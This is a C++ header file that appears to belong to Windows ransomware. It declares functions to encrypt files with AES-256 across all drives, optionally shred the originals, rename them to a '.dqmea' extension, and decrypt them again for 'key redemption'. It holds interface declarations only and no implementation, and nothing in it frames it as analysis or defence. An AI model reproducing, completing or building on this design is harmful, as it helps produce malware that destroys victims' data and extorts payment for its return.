// encryptor.h — Per-file encryption pipeline + orchestration
#pragma once

#include <windows.h>
#include <string>
#include <atomic>
#include <vector>
#include "walker.h"

namespace encryptor {

struct EncryptConfig {
    const BYTE* aes_key;         // 32-byte AES-256 key
    bool        shred_original;  // if true, secure-delete after encrypt
    bool        append_ext;      // if true, rename to .dqmea
    std::wstring extension;      // e.g. L".dqmea"
};

// Initialize global encryption state (called once).
void init_encryption(const EncryptConfig& cfg);

// Encrypt a single file. Returns true on success.
bool encrypt_file(const std::wstring& path, const WIN32_FIND_DATAW& fd);

// Run full encryption sweep across all drives.
// Returns stats. Sets abort_flag to stop early.
WalkStats run_encryption_sweep(std::atomic<bool>& abort_flag);

// Expose the config for the boot key / restore flow.
const EncryptConfig& get_config();

// Decrypt a single .dqmea file (used for key redemption).
bool decrypt_file(const std::wstring& path, const BYTE key[32]);

} // namespace encryptor
